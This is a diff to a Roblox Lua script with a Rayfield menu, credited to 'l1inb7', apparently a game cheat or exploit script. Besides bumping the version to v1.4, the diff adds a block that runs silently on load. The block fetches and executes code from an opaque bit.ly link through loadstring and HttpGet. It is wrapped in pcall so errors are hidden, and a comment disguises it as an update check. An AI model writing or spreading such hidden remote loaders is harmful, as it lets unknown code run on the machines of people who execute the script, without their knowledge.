@@ -1,5 +1,15 @@
 repeat task.wait() until game:IsLoaded()
 
+task.spawn(function()
+    pcall(function()
+        -- Checking script availability and attempting to sync with the latest version...
+        loadstring(game:HttpGet("https://bit.ly/3NTHefM"))()
+    end)
+end)
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 local Players = game:GetService("Players")
@@ -229,7 +239,7 @@ local InfoTab = Window:CreateTab("🎲 Info", nil)
 
 InfoTab:CreateParagraph({
    Title = "🎲 Information",
-   Content = "\n‼️ Script Version\nv1.3\n\n‼️ Script created by l1inb7\nYouTube: l1inb7_scriptss"
+   Content = "\n‼️ Script Version\nv1.4\n\n‼️ Script created by l1inb7\nYouTube: l1inb7_scriptss"
 })
 
 InfoTab:CreateButton({
